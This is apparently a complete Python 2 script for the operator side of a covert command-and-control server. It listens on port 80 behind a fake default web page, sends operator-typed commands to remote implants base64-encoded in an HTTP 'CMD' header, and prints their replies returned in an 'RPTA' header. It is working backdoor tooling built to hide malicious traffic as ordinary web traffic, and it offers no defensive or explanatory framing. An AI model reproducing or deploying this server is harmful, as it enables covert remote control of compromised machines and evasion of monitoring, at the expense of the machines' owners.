from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
import base64
PORT= 80
class clsMaster(BaseHTTPRequestHandler):

   def do_GET(self):
     self.send_response(200)
     if (self.headers.get('RPTA')):
       rpta=self.headers.get('RPTA')
       print base64.b64decode(rpta)

     else:

       cmd = base64.b64encode(raw_input("command:>> "))
       self.send_header('CMD',cmd)
       self.end_headers()
       self.wfile.write("<html><body><h1>It works!</h1><p>This is the default web page for this server.</p><p>The web server software is running but no content has been added, yet.</p></body></html>") 
     return
try:
   server = HTTPServer(('',PORT), clsMaster)
   server.serve_forever()
except KeyboardInterrupt:
    server.socket.close()
